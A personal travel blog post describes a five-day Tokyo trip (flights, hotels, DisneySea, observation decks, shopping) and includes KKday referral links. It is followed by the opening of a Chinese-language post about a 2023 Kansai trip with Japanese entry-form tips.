travel companions wanted to see or what we felt like doing at the moment.Sean and James handled most of the planning. We needed to buy tickets in advance for Disneyland (Sea), the Gundam in Yokohama, and Shibuya Sky, so we purchased those tickets two weeks before departure. If you don’t buy tickets in advance, you might find no available spots when you arrive.This time, I brought along the leftover ¥60,000 from my last trip, and I ended up with about ¥5,000 left. This was because I encountered issues with my Visa card at a drugstore in Shinjuku and had to pay cash for over ¥10,000 worth of items, plus I wanted to spend all my cash before leaving. Additionally, I almost couldn’t make it back; when buying tickets to Narita Airport at Tokyo Station, my card wouldn’t work, and I had to scramble to gather enough cash for the fare.Travel🛫Since this trip was only 5 days long, I prioritized early departure and late return for the flights. I used SkyScanner to find suitable flights.Taoyuan &lt;-&gt; Narita 6/7 EVA Air BR 184 08:00 TPE -&gt; NRT 12:25 6/22 EVA Air BR 195 20:40 NRT -&gt; TPE 23:20Round trip: $17,086 I made a mistake here; I shouldn’t have booked three tickets under one name. Each person should buy their own ticket because using a credit card to purchase tickets provides travel insurance. Later, I found out that flying from Songshan to Haneda wasn’t much more expensive and was more convenient. Orz.Travel insurance: Done📲I also bought a 5-day unlimited SIM card from KKDAY for about $500. ( Japan eSIM Card | Daily High-Speed, Unlimited Data Plans )🚈As with my previous trip, I used a Suica card with my iPhone. My friend, who has an Android phone, had to buy a Welcome Suica limited-time card (which was the only option available at Narita Airport).AccommodationSince we were only going to Tokyo, I looked for a place where we could stay for four days without changing hotels. As the date approached, all the chain hotels like Toyoko Inn and APA were fully booked. I had to use Agoda to find a hotel located centrally with access to train and subway stations.Hotel Villa Fontaine Grand Tokyo-Shiodome — 4 NightsIt’s right next to Shiodome Station, making it easy to get to Odaiba or Shinjuku.To reach other locations, you need to walk to Shimbashi Station (about a 10-minute walk), and it takes another 10 minutes to get from Shimbashi to Tokyo Station (1-2 stops away).Overall, it was convenient, reasonably priced, and had good reviews. The actual stay was clean and comfortable, and the room wasn’t too small.Since there were three of us, the layout included two beds and a sofa bed (which felt just like a regular bed).Total for 3 people: NT$23,894CHO Stay Capsule Hotel - The Only Airport Capsule Hotel in Taiwan | Taoyuan Airport Capsule Hotel | Taoyuan Airport Hotel | Taoyuan Airport Hotel | 桃園空港 ホテル — Day 0 OvernightThis trip was a bit special because we had an 8 AM flight, and we all started from Taipei. We planned to arrive at the airport by 6 AM, so we had to leave home around 4-5 AM. Plus, the excitement of going out made it hard to sleep, so we hardly got any rest.A few days before departure, we decided to stay overnight at the airport. I heard from friends that there was a capsule hotel at Taoyuan Airport, so I decided to give it a try!Location: On the 5th floor of Terminal 2, south side; it’s about a 5-minute walk down to Terminal 2.The rooms include double rooms, triple rooms, quadruple rooms, and single beds (about 16 beds in a room).When we booked, only single beds were available.1 person NT$1,500Day 0 DepartureBasically, I just unloaded the items I bought in Kansai, took out some clothes and supplies, and then repacked my suitcase before heading out.The airport express check-in currently doesn’t allow for checking in for flights the next day, so I had to carry my luggage to Terminal 2.Sean &amp; Me &amp; JamesAfter arriving at Terminal 2, I went straight up to the third floor to the departure hall. Once there, I found the observation deck at the south side of the 22-26 shopping area (walk to the end on the right side of the hall).At the end, I saw the escalator going up.At the top of the escalator, you’ll find a hotel entrance with a distinctly Taiwanese style.Taoyuan Airport Capsule HotelAfter checking in, we could drop off our luggage and then head out to find something to eat. Eating and drinking are prohibited in the rooms. During our stay, each person received a tea bag that we could ask the front desk to brew for us, and we could enjoy it at the bar outside. We also filled out a membership form to receive a free towel.The entrance had earplugs available for free.HallwayThe bathroom facilities were very new, clean, and comfortable. There were two toilets, five shower rooms, and two hairdryers (one Dyson), along with body wash and shampoo provided. You just need to bring your own towel and toiletries.Men’s BathroomTo the left upon entering, there was a luggage room for storing bags, and the bed layout was as follows:Dormitory BedsEach bed had its own mirror, desk, lamp, curtains, and trash can. I slept on the upper bunk, which had a thick mattress, so I didn’t have to worry about disturbing the person below me.The mattress was not only thick but also long enough; at 176 cm, I had no issues sleeping comfortably. The environment was clean, the lighting was warm, and the air conditioning was very comfortable. The only unavoidable factor was that if someone snored, it could be heard. (That’s why they provide free earplugs at the entrance.)However, I wasn’t bothered by the noise; as long as it was warm and relaxing, I could sleep well. I ended up sleeping soundly until morning, waking up just before 6 AM to wash up and check out (I made sure to get plenty of rest before heading abroad). Thankfully, we had made a reservation the night before; there were other travelers who wanted to check in on-site, but there were no available spots.In the morning, I leisurely enjoyed the airport view:I initially thought it would be crowded at 8 AM, but I was lucky that there were hardly any people. If I had known, I would have slept until 7 AM at the capsule hotel before coming down!Waiting for the FlightThis time, the boarding gate required taking a shuttle bus (which mainland Chinese netizens refer to as a ferry bus).It was hot and crowded, but we made it to the boarding gate:Bye 🇹🇼Arriving at Narita AirportHey 🇯🇵Day 1 Shibuya, Parco, Shibuya SkyFrom landing to reaching the immigration hall took about 15 minutes, and by the time I picked up my luggage and cleared customs, it was already around 1 PM. I made a silly mistake when transferring to the Narita Express; I directly tapped my Suica card to enter the station. It turned out that the entire express train had reserved seating, so I had to go back, buy a ticket, and then re-enter the station (later I found out that I could have bought a ticket at the platform machine).Eventually, I boarded the Narita Express at 2 PM heading to Tokyo Station.As we enjoyed the scenery, seeing the Tokyo Skytree meant we were getting close.After arriving at Tokyo Station, I transferred to the subway to Shimbashi Station, then walked to Shiodome.The hotel was hidden inside an office building, which was quite unique:At first, I thought I had walked into an office building by mistake, but as I went further in, I found the hotel.After dropping off our luggage, we took a moment to rest:Hotel Villa Fontaine Grand Tokyo Shiodome (The video was shot later, so it’s a bit messy XD)Heading to ShibuyaThis intersection is a must-visit; it reminds me of the challenges in “Alice in Borderland.”Netflix — Alice in BorderlandShibuya Parco — Gyu-KakuWe lined up to taste the famous Gyu-Kaku, arriving around 5:30 PM, and waited about 45 minutes for a table.I ordered a set that included Kobe beef hamburger, Kobe steak, soup, and ice cream ($3,355 yen):The staff set the initial cooking level to about 1, and I had to grill it on the iron plate to my preferred doneness.Gyu-KakuHere’s the translated text in naturalistic English, keeping the original markdown image sources:Make sure to use two pairs of chopsticks: for hygiene reasons, use the metal ones for cooking and the bamboo ones for eating, alternating between them. Kobe steak is incredibly delicious, juicy and tender, with no beefy smell at all 🤩; the hamburger patty is also good, but a bit greasy.Shibuya Parco — A Store Dedicated to the Self-Mocking Polar BearI accidentally bought a few things.Shibuya — Shibuya SkyFortunately, Sean bought tickets in advance; if we had tried to buy them on-site, we wouldn’t have been able to get in. KKday SHIBUYA SKY Observatory E-Ticket｜Buy Now, Use ImmediatelyIt was quite dark and a bit windy up there, and you can’t bring bags (there are lockers available). Besides a bar in the corner, there are no other facilities or light pollution, making it great for taking photos and enjoying the night view.You probably need to make a reservation for the bar, and its hours coincide with the visiting hours.After returning to the hotel, we ended the day with a set of sake, instant noodles, and snacks.The tofu skin instant noodles were really tasty.Day 2: Yokohama Gundam, Odaiba, ShinjukuOn the second day, we rushed to the 10 AM Gundam show, taking the train to Sakuragicho Station and then transferring to a cable car and walking to the Gundam factory.Yokohama GundamThe weather was fantastic!!The Gundam show ran from 10 AM until noon, with different scenes in each performance; however, since I’m not a Gundam fan, I just tagged along and enjoyed the spectacle.I must say it was quite impressive, with intricate details, movements, and sound effects.There was also a merchandise store inside selling Gundam models and exclusive items.Sean’s completed Gundam model.Since I’m not a Gundam enthusiast, I browsed around a bit, watched a few performances, and then left.OdaibaNext, we headed to Odaiba. The train from Shiodome to Odaiba was really cool, offering views of Fuji TV and the entire Odaiba landscape.Upon arriving in Odaiba, we first checked out the Statue of Liberty.It’s a 1/7 scale replica of the Statue of Liberty in New York, symbolizing the friendship between Japan and France.Walking a bit further, we turned around to see Fuji TV, which has been destroyed multiple times by the characters in “Police Story.”Continuing a bit further, we found a mall where we had takoyaki and Taiwanese fried chicken.The takoyaki was average; there were too many pieces, making it a bit overwhelming. The fried chicken was quite unique; although it was labeled as Taiwanese karaage, it was actually a Japanese-style chicken cutlet (thin and boneless) fried with Taiwanese-style batter. It was different from actual Taiwanese fried chicken, but I still told the staff it was delicious and that I was from Taiwan 🤣.I initially planned to buy some clothes and shoes at the Odaiba department store, but as we got closer, I noticed the subway could take us to Shinjuku, so we suddenly changed direction and headed to Shinjuku.ShinjukuWe started shopping and exploring.I stopped by La Labo to smell the Tokyo-exclusive GAIAC 10 fragrance.I found it quite subtle… woody notes… hard to detect. (But I still ended up buying it on Day 4.)In the end, I only bought some clothes, pants, and cosmetics at the department store. As the weather started to turn cloudy and rainy, we headed back to the hotel.We ended the day with food again.The hot dog was delicious, and the fruit wine was great!Day 3: DisneySeaWe set off early, and the weather was drizzly that morning. KKday Japan｜Tokyo Disney Resort TicketsWe bought tickets for DisneySea, not for Disneyland. The beautiful castle is only in Disneyland; to enter DisneySea, you need to take an internal train. After entering the park, we started trying to get tickets for shows or attractions, but we didn’t win any. In the end, we purchased front-row seats for the evening fireworks show, “Believe! - Sea of Dreams” (you can also watch from the outside without buying a ticket, as the show takes place in the harbor’s public area).The rain kept getting heavier, so we first bought Mickey raincoats from a nearby shop:I thought the quality was quite good, and there were cute Mickey or Minnie designs (in deep red) to choose from, plus they weren’t expensive!! Fortunately, it stopped raining in the afternoon!! I’m not a rain man!!After buying the raincoats, we rushed to the “Toy Story Mania”:There were a lot of people, and we waited about 100 minutes to get in:The game involves two players (one person plays against a machine) using buttons to shoot at projected balloons to score. It’s very fun, but not too thrilling, making it perfect for couples or families.Next to it, there was Mr. Potato Head’s interactive theater performance and a small souvenir shop:Such cute plush toys of Forky!!Next, we went to “Soaring: Fantastic Flight,” another popular attraction:After queuing, before the ride starts, there’s a scene that sets the story of an explorer, with paintings on the wall that are actually high-definition screens with animations and narration—very impressive!The theater features a spherical giant screen and a 4D experience (the seats move forward and backward, and you can smell different scents); the content showcases landscapes from around the world, such as the prairie, which has the scent of grass. It’s stunning and suitable for everyone! We purchased a fast pass for this.After enjoying these two attractions, it was close to noon, and we started looking for food. Since all the restaurants were full, we had to settle for snacks like pizza and chicken legs.As we came out with our food, the harbor performance “Colorful Celebration” was about to start:After eating, we wandered around the park and checked out the souvenir shops:Once we digested a bit, we started queuing for “Journey to the Center of the Earth”:It took about 90–100 minutes to wait, and by the time we got on, we had fully digested our food; otherwise, it would have been too intense XD.The ride is a recreation of the movie “Journey to the Center of the Earth,” with impressive scenes and immersion; at the end, there’s a drop and a slight acceleration (a feeling of weightlessness). It’s thrilling but not to the point of making your legs weak, making it suitable for those looking for a bit of excitement.After that, we went to “20,000 Leagues Under the Sea” to relax a bit:There weren’t many people, and the experience simulates the feeling of diving in a submarine (though it’s likely a simulation), with very low thrill levels, making it suitable for small children.After that, we continued to stroll and eat:The Mickey ice cream bars were super cute but very sweet, and there was also Anna Bell (Rena Bell).We kept walking and taking pictures; the park is really large, and I didn’t take any photos of the animated dreamlike scenes:At the end of the park, we hopped on the “Indiana Jones Adventure: Temple of the Crystal Skull”:It wasn’t as thrilling as the Journey to the Center of the Earth (no weightlessness or speed), but it featured immersive scenes from the Indiana Jones movie, which I found interesting and fun.We continued to explore:We also took the “DisneySea Waterway” and the “DisneySea Electric Railway” since our feet were sore; it was nice to see the scenery along the way. These are more like transportation facilities within the park, without any special ride effects.As evening approached, we started shopping and taking photos:I have to say, it’s easy to go a bit crazy shopping because there are so many 40th-anniversary limited items; I also took a photo with the Earth.As the performance time approached, we headed back to the harbor and found a spot to sit on the ground.As mentioned earlier, we purchased general seating for the show.The entire performance was an immersive experience, featuring music, projections (the volcano in the background erupts!), lasers, fireworks, and storylines involving DisneySea characters… all combined beautifully. You definitely need to stay until the evening to watch the show to get your money’s worth. After a full day at Disney, my takeaway is that all the attractions are very immersive; they aren’t just simple rides but aim to let visitors feel like they’re part of the characters and scenes. Although they may not be as thrilling as Universal Studios, I found them very enjoyable; the evening fireworks show is a must-see! There are so many cute merchandise items that you need to control your spending (watch out for impulse buying)! As for food, we just ate whatever; I think it would be better to bring your own food. If time allows, you should spend two days at both the land and sea parks; the sea park doesn’t have the dream castle or parades like the land park QQ.Outside JR Maihama Station, there’s one last merchandise store where you can shop, and I browsed around a bit before reluctantly leaving.After returning to the hotel, we continued our daily routine; today we had soy sauce instant noodles, melon fruit juice (delicious!!), Akoya’s plum wine (delicious!!), and oolong shochu (not much flavor, not good).Day 4: Tokyo Tower, Meiji Shrine, Le Labo, Kameari Police Station, Asakusa Senso-ji, SkytreeAfter a good night’s sleep, I started thinking about today’s itinerary (crazy ENFP style). The only thing we all had planned together was the Skytree in the evening; in the morning, my friends went to Akihabara, so it was a day for me to explore Tokyo alone.Tokyo TowerI checked the map and saw that Shinbashi wasn’t far from Tokyo Tower, so I decided to head there first.When I stepped outside, I found out that there was a serious delay on the subway due to an incident. Since Google Maps showed it wasn’t far, I decided to walk (about 20 minutes):Feel free to let me know if you need any further modifications or additional translations!Here’s a naturalistic English translation of the provided text, while keeping the original markdown image sources intact:Walking alone through the streets of Tokyo, the weather in June is pleasantly warm, with a nice breeze blowing.I came across a vendor selling hot roasted sweet potatoes by the roadside.As I made my way to Tokyo Tower, I passed through a park called “Tokyo Metropolitan Shiba Park.” The view of the tower through the branches here is quite charming:Continuing along the path, I soon arrived at the base of Tokyo Tower. [_KKday Japan Tokyo Tokyo Tower Main Observatory E-Ticket_](https://www.kkday.com/zh-tw/product/12271-japan-tokyo-tower-observatory-e-ticket?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} Inside the tower, I purchased a Top Deck ticket. This not only allowed me to go to the very top of the tower but also included a guided tour (with Chinese audio) and a commemorative photo! (The experience was fantastic.)The tour featured animated murals similar to those at Disney, where two characters were having a conversation about constructing a landmark building in Japan. One of the architects’ other works is the Tsutenkaku in Osaka.The morning view of Tokyo from above is also quite nice; in the third photo, you can see the Skytree in the distance, which I plan to visit later tonight.Finally, here’s a free commemorative photo of my successful ascent!Meiji ShrineAfter visiting Tokyo Tower, I checked the map and decided my next stop would be Meiji Shrine.After exiting the subway, I walked quite a distance (about 30 minutes) to reach Meiji Shrine.Interestingly, I happened to witness a traditional Japanese wedding ceremony while I was there:After completing my visit at the main hall, I left.I found Meiji Shrine to be quite solemn and serious, and later, when I went to Senso-ji Temple, it felt too crowded with tourists.My next stop was Kameari, the setting of “Kameari Kōen-mae Hashutsujo,” a show I grew up watching, and I wanted to see what it looked like. On the way, I first stopped by Le Labo in Omotesando to take another whiff of their fragrances.LE LABO Aoyama StoreTo be honest, I’m not that interested in Le Labo; I personally prefer Ormonde Jayne perfumes, and Le Labo gives me a mass-market vibe.After smelling a few, I bought Another 13, which has a strong scent. I also succumbed to the trend and purchased the Tokyo-exclusive Gaiac 10, both in 15ml as souvenirs.Le Labo perfumes are packaged and labeled on-site (which takes about 15–20 minutes), and you can customize your own label. I chose “ZhgChgLi” for the one I like, and for the Tokyo scent, I awkwardly asked the staff which one represents Japan; he said ♨️ 😝.The prices for Le Labo in Japan are as shown above, and with tax exemption, Another 13 was about 1,000 yen less.The Tokyo-exclusive Gaiac 10 was more expensive, costing 16,800 yen even after tax exemption.Kameari Kōen-mae HashutsujoAfter my shopping, I continued on to Kameari (which is quite far).As soon as I exited the station, I saw a statue of the characters from Kameari Kōen-mae Hashutsujo:I checked the map and headed to Kameari Park first:It was just an ordinary park, with many kids playing soccer. There was a statue of a character sitting on a bench, but it was surrounded by kids’ belongings, so I didn’t take a photo.I found out online that the nearby Ario department store has scenes from Kameari Kōen-mae Hashutsujo and an amusement park, so I continued walking (about 10 minutes):Once inside, I was a bit disappointed; it was almost certain that Kameari Kōen-mae Hashutsujo is no longer being maintained as an IP (young people don’t watch it anymore…). Aside from the statue at the station, the park scenes have been transformed into an amusement area (with claw machines).The worst part was the gacha machine at the entrance; the character’s eyes were broken and not repaired, making it all feel quite sad. In the end, I got a police officer in hot pants from the gacha and left feeling a bit disappointed.I checked the map and took a bus to Asakusa, which was closer. It took about 15 minutes to find the bus stop and check the route:On the way to the bus stop, there were hardly any people or tourists, and the bus route was not translated on Google; I had clearly entered a non-touristy area.I had a bit of a mix-up when getting on the bus because in Kyoto, you pay after getting off, so I stood there confused, not understanding Japanese, until a kind Japanese passenger told me to pay at the front.The ride was quiet and comfortable; Japanese drivers wait until passengers are seated and ready to get off before starting the bus. I leisurely made my way to Senso-ji Temple. KKday [_Japan Tokyo Edo Asakusa Kaminarimon Rickshaw Experience_](https://www.kkday.com/zh-tw/product/1951-tokyo-asakusa-rickshaw-tour-japan?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} KKday [_【Recommended Kimono Rental in Tokyo!】 Asakusa Kimono Experience (The first Japanese-style kimono store in Asakusa, just a 3-minute walk from Kaminarimon)_](https://www.kkday.com/zh-tw/product/140384?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} There were so many tourists at Senso-ji Temple! It was incredibly crowded, and I could only find angles to take photos.As I continued deeper into Senso-ji, the crowds were overwhelming. I hadn’t planned to buy anything, just to walk around and look; however, I stumbled upon a bean shop that was surprisingly delicious, so I bought some as souvenirs.After reaching Senso-ji, I took a few photos and then left.By this time, it was getting close to evening, so I slowly made my way toward the Skytree.A distant view of the Skytree from Senso-ji.SkytreeSince it was still early, I decided to walk and enjoy the scenery along the way. KKday Tokyo Skytree Observatory Ticket / Enjoyment Package Tokyo Subway 24-Hour Ticket / Sumida AquariumThe closer I got, the larger it appeared.Upon arriving at the Skytree, I first wandered around the shopping mall inside and ordered a cup of Hokkaido strawberry ice cream to take a break.We didn’t get the Top Deck tickets for the Skytree, only the middle observation deck, with entry at 7 PM.When we first went up, it wasn’t dark yet, so I snapped a few casual photos:After sunset, the view of Tokyo’s nightscape was stunning:In the first image, the Tokyo Tower is visible in the upper left corner; it was quite dark inside, and the glass reflected too much light, making it hard to take selfies.I managed to take a somewhat decent selfie XDBefore leaving, I took one last look back for a photo.For my final night, I dined at an izakaya and captured some night scenes along the way:Grilled ChickenThe weather in Japan turned bad today; I didn’t expect to see the Tokyo Tower and some unique art installations on my last day while passing through Shiodome.Last Night’s Late Night SnackNothing beats Nissin instant noodles paired with convenience store fried chicken 🤤! A few days ago, I bought melon-flavored juice, and today I got strawberry; both were delicious. I don’t remember the sake, but these two should be pretty standard.Day 5: National Diet Building, Imperial Palace, Tokyo Station, and Return TripAfter waking up, I dropped off my luggage and, like Day 4, explored Tokyo at my own pace since my flight was in the evening, giving me half a day to wander. The weather was cloudy and rainy.I remembered seeing a gacha machine at the Skytree yesterday featuring the National Diet Building, which I hadn’t seen before, so I headed there first.National Diet BuildingOne interesting thing I encountered on the way was a protest by Japanese extremists:They were driving a promotional vehicle loudly broadcasting near the National Diet Building. After being stopped by the police, they dismantled their speaker. Later, they sped through a red light to escape, and there were police everywhere; it was a bit scary.I passed by the National Diet Building, but the main gate was closed, so I didn’t go in (I think you can enter through a side door for a visit?):I took a distant photo as a memento and then headed down toward the Imperial Palace.Imperial PalaceThe Imperial Palace is really vast; it took me almost 30 minutes just to walk from the outer entrance.After reaching the keep, I left since the inner palace was not open for visits that day.I walked for almost another hour back to Tokyo Station (I could have taken the subway, but it was just one or two stops; I prefer to walk and enjoy the scenery).Tokyo StationBy this time, it was close to noon, so I wandered around Tokyo Station. I just wanted to prove to myself that I wouldn’t get lost, but I was too lazy to queue at the famous souvenir shops.For my last meal, I had tempura soba.I also picked up a large and a small bottle of sake to take back to Taiwan from a liquor shop, where the staff happened to be Taiwanese.Return TripAround 4 PM, I returned to the hotel to pick up my luggage and slowly made my way to Narita Airport.A last glimpse of Shimbashi before leaving.This translation aims to maintain the original tone and context while ensuring it reads naturally in English.On the way back, we headed directly from Shimbashi to Narita Airport. Due to the schedule and having plenty of time, we took the Toei Asakusa Line Airport Express, which takes about 1 hour and 15 minutes. However, we couldn’t use our cards or Suica to buy tickets, so we had to scramble to gather enough money for three tickets, and we almost couldn’t afford it.We arrived at the airport around 5:30 AM, which was still quite early.After clearing immigration, we still had time, so we grabbed a quick bite to eat and took one last stroll through the duty-free shops.I found that if you want to buy Dassai or common souvenirs (like Shiroi Koibito or banana cake), they have everything here, so it’s best to buy them at the airport XD.The price for Dassai was about the same as what I found at Tokyo Station.Once we boarded the plane, hey 🇹🇼:The weather in Japan was quite bad, and the plane was shaking a lot (like a dead fish eye), even more thrilling than the rides at Disney. We had to stop our meal for a while; thankfully, we arrived safely in Taiwan in the end.After going through customs, it was around 00:12. We took a white taxi back to Taipei, arriving around 01:30. After a quick shower, I went straight to bed, marking the end of this journey.Postscript For insights on Japanese culture, please refer to my previous post “[Travelogue] 2023 Kyoto, Osaka &amp; First Landing in Japan](../76d66c2e34af/).” Japan uses a 30-hour time format, where 25:00 means 1:00 AM. How cool is that? Make sure to keep at least 10,000 yen on hand to avoid situations where you can’t use your card or Visa. Special thanks to my travel companions, Sean (INFJ) and James (ISTJ), the planning geniuses; Sean was in charge of deciding which Disney rides to do first and which fast passes were worth it.After returning to Taiwan, I kept hearing this catchy song on repeat.KKday Promotions [**KKday Japan Tokyo Disneyland Resort Tickets Tokyo Disney Resort**](https://www.kkday.com/zh-tw/product/19252?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} [**Japan eSIM Card Daily High-Speed, Unlimited Data Plans**](https://www.kkday.com/zh-tw/product/137689-japan-high-speed-daily-unlimited-data-japanese-esim?cid=19365){:target=”_blank”} [SHIBUYA SKY Observatory E-Ticket Instant Use](https://www.kkday.com/zh-tw/product/133300-shibuya-sky-observatory-e-ticket-tokyo?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} [Japan Tokyo Edo Asakusa Senso-ji Sky Tree Rickshaw Experience](https://www.kkday.com/zh-tw/product/1951-tokyo-asakusa-rickshaw-tour-japan?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} [Tokyo Kimono Rental Recommendations! Asakusa Kimono Experience (the first Japanese-style kimono shop in Asakusa, just a 3-minute walk from Senso-ji)](https://www.kkday.com/zh-tw/product/140384?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} [Tokyo Tokyo Tower Main Observatory E-Ticket](https://www.kkday.com/zh-tw/product/12271-japan-tokyo-tower-observatory-e-ticket?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} If you found this article helpful, feel free to use my referral link to purchase KKday products and tours. I will earn a small commission, which helps me create more travel content. Thank you!More Travelogues [Travelogue] 2024 San’in Region, Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, Kobe 7-Day Solo Trip [Travelogue] 2024 Second Visit to Kyushu 9-Day Free Trip, Entering via Busan → Hakata Cruise [Travelogue] 2023 Hiroshima and Okayama 6-Day Free Trip [Travelogue] 2023 Kyushu 10-Day Solo Trip [Travelogue] 9/11 Nagoya One-Day Flash [Travelogue] 2023 Kansai 8-Day Free TripIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.If you found this article helpful, feel free to use my referral link to purchase KKday products and tours. I’ll receive a small commission to support more travel content. Thank you! Follow Me on Medium 1K+ Followers 1,698 Total Views Last Statistics Date: 2025-08-15 | 1,661 Views on Medium." }, { "title": "遊記 2023 京阪神 8 日自由行", "url": "/posts/z-%E5%BA%A6%E6%97%85%E8%A1%8C%E9%81%8A%E8%A8%98/%E9%81%8A%E8%A8%98-2023-%E4%BA%AC%E9%98%AA%E7%A5%9E-8-%E6%97%A5%E8%87%AA%E7%94%B1%E8%A1%8C-76d66c2e34af/", "categories": "Z 度旅行遊記", "tags": "生活, japan, kyoto, osaka, traveling", "date": "2023-07-07 20:13:20 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2023 京阪神 8 日自由行2023/05 京都、大阪、神戶 8日自由行紀錄及食住行入境資訊前言之前只去過 2019 🇲🇾 Sabah 跟 2018 🇹🇭 Bangkok 兩個東南亞國家並且都是跟團。很喜歡東南亞萬...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2023 京阪神 8 日自由行2023/05 京都、大阪、神戶 8日自由行紀錄及食住行入境資訊前言之前只去過 2019 🇲🇾 Sabah 跟 2018 🇹🇭 Bangkok 兩個東南亞國家並且都是跟團。很喜歡東南亞萬里無雲的藍空和不受拘束的放縱ENFP身為一個熱情衝動、說走就走的 ENFP，此次行程從提議到出發中間只間隔了兩週；起因是友人 黃馨平 剛好有職涯 GAP，他也剛好 ENFP 互補人格 INFJ；我提供熱情方向，他提供細節計畫，一搭一唱下，就臨時起意就出發了。KKday 推廣 【一人成行】京都天橋立一日遊｜伊根灣遊船・天橋立・美山茅屋之里｜大阪難波出發 海之京都《神隱少女》觀光列車一日遊｜丹後紅松號／黑松號・天橋立 View Land・ 觀光船・傘松公園｜大阪出發 【1人成行】京都奈良一日遊｜嵐山＆伏見稻荷大社＆金閣寺＆奈良公園｜可選日式午餐方案（大阪、京都出發） 日本環球影城｜環球影城 Universal Studios Japan 門票 &amp; 環球特快入場券（快速通關 Express Pass） 日本 JR PASS|關西地區鐵路周遊券|eMCO 電子票 日本 JR PASS|關西廣域鐵路周遊券|eMCO 電子票 關西&amp;山陰地區鐵路周遊券 JRPass 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案行前準備樂因為一切都很隨性，只安排要去大阪環球，因此先從網路買門票；因為時間太靠近了，什麼都賣完了，只能買普通入場門票。 日本熱門景點、樂園真的都要提早買 Orz ，這次敗在棒球，現場連票都沒有，只能場地一日遊。其他景點、寺廟、旅程，隨性。日幣一定要換，大部分的寺廟門票、紀念品、御守跟部分電車(要買有座位的話)只能使用現金。這次我換 $50,000 日幣，最後還剩 $15,000 上下。行🛫距離出發時間不到一個月，沒什麼好挑的了，直接上 SkyScanner 找了一個符合我們兩個隨性步調的航班：桃園 &lt;-&gt; 關西 5/22 長榮 BR 130 13:35 TPE -&gt; KIX 17:15 (實際延誤 1 小時多，18:40 才到日本) 5/29 長榮 BR 177 11:10 KIX -&gt; TPE 13:05來回： $14,915好像是去年開始行李托運改成計件＋計重，每人限一件 &amp; 23kg 內；其他都要加錢。 因信用卡刷卡買機票會送旅遊保險，因此建議個人分開來買機票，並要查一下銀行信用卡的保險內容，有的簽帳卡可能沒有。另外也可以自己加保旅遊險（醫療、不便、遺失、意外…）這次保 8 天大概 $1,500。The Flight Tracker推薦安裝 The Flight Tracker App 輸入航班資訊就能實時追蹤航班資訊，包含航廈、登機門、行李櫃檯資訊。(有更改他也會通知，不過還是以現場資訊為主)飛機起飛前幾個小時還可以開啟 iOS Live Activiy 功能實時追蹤📲網路我是直接上 KKDAY 買 8 天吃到飽的 SIM 卡約 $700；也有 E-SIM 版本，但是我還是習慣抽換實體 SIM 卡，心裡比較保險。 可以把 SIM 卡(含 SIM 卡針)放隨身，飛機安全著陸後在機上就能換成日本 SIM 卡 記得換完後要去設定開漫遊，然後重開機 日本的吃到飽不一定是真的吃到飽，超過某個流量會被降速，詳細可詢問賣家；建議要傳影片或看影片還是要連 Wi-Fi🚈電車地鐵或公車都可直接使用 Sucia 西瓜卡；部分超商、購物也可以使用。iPhone 可以直接去「錢包與 Apple Pay」-&gt;「加入卡片」-&gt;「交通卡」-&gt;「日本」-&gt;「Sucia」-&gt; 直接啟用虛擬 Sucia。 但要使用 Master Card 的信用卡進行儲值，我用 Visa 卡都儲值失敗； 建議一定要在台灣就先弄好儲值好，不然去日本發現不能儲值、也收不到簡訊驗證碼，等於直接不能用。如果不能用 iPhone Sucia 或是 Android；目前日本實體 Sucia 都缺貨，只能買 28 天 Welcome Suica 限時西瓜卡，可以儲值、使用， 但期限過後即失效、也不能退款 。Apple Watch 也有 Suica 可以用（與 iPhone 不互通），記得在台灣也先設定好、儲值好。iPhone 交通卡在感應時不用特別把 Apple Pay 畫面叫出來，只要裝置拿出來就能直接感應（會自己喚醒感應）。住主要是用 Agoda 找距離電車地鐵站近的。京都 2 晚： 東橫INN京都四條大宮東橫 INN 是東北亞通的朋友推薦的連鎖飯店體系，CP 值高也不會踩到雷，而且有附日式早餐(飯糰 or 咖哩飯)。因訂的時間太晚，只剩四條大宮的東橫 INN 還有空房；距離京都車站比較遠，大約 3 公里：2人共 NT$3,844大阪 4 晚： APA Hotel Osaka Umeda (大阪梅田)一樣因為訂的時間太晚，選擇不多；我們選擇距離車站較近但價格較高的另一個連鎖飯店體系 APA；無附早餐，但有游泳池、公眾湯屋…等設備。從大阪梅田車站出來走路大約 15 分鐘會到：2人共 NT$21,459預入境申請 (加速通關)無需特別申請簽證、無需提供 COVID 疫苗/核酸證明；機票與訂房都完成後，就可以去 Visit Japan 填寫欲入境訊息，到時候下飛機手機連上網路後，就能直接入境，沒預先申請的話只能當場填寫紙卡。1.註冊： https://www.vjw.digital.go.jp/main/#/vjwpco001 帳號 因密碼規則可能不是平常自己習慣的密碼；因此請牢記，或另外寫下來，避免在日本入境要使用時忘記密碼登不進去2.選擇「登錄入境、回國預定」3.輸入入境航班資訊圖片僅共示意旅行名稱：自訂，給自己看的4.輸入在日聯絡處圖片僅共示意我是輸入第一天住宿的飯店資訊，用 Google 查英文版的飯店地址、飯店聯絡電話 (應該不用太精確，不要太離譜就好，至少飯店名稱要對)5.登陸預定圖片僅共示意6.選擇「返回入境、回國手續」繼續填寫資料7.選擇「外國人入境紀錄」8. 填寫基本資料入境天數包含到達到離開，一共 8 天。最後一步完成登錄：9.再次選擇「返回入境、回國手續」填寫「海關申報準備」填寫完基本資料後，一路選擇「否」到最後完成登錄:10.完成入境時步驟： 連上網路，登入網站 第一步，入境審查，找到「入境審查準備」選擇「顯示 QR 碼」 下拉到網頁底部找到「顯示 QR 碼」[2024–11–25 更新]「入境審查」與「海關申報」QR Code 已合併成同一個「入境审查及海关申报的QR码」，沒有藍碼黃碼區別，以下內容只當紀錄，可以忽略。 將護照與 QR 碼給簽證官即可 (黃碼) 